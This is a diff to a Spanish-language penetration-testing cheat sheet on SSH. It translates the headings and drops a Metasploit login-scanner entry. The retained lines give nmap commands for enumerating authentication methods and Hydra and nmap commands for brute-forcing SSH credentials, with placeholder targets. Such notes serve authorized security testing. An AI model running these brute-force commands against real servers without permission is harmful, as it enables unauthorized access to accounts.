@@ -1,8 +1,10 @@
-## Ver metodos de login del ususario
+# SSH
+## Enumeración
+### Ver metodos de login para un ususario
 ```
 nmap -p PORT IP --script ssh-auth-methods --script-args="ssh.user=USER"
 ```
-## Bruteforcing
+## Ataques por fuerza bruta
 ### Hydra
 ```
 hydra -L UserList -P PassList ssh IP
@@ -11,7 +13,4 @@ hydra -L UserList -P PassList ssh IP
 ```
 nmap --script ssh-brute --script-args userdb=Userlist -p PUERTO IP
 ```
-### Metasploit module
-```
-auxiliary/scanner/ssh/ssh_login
-```
+
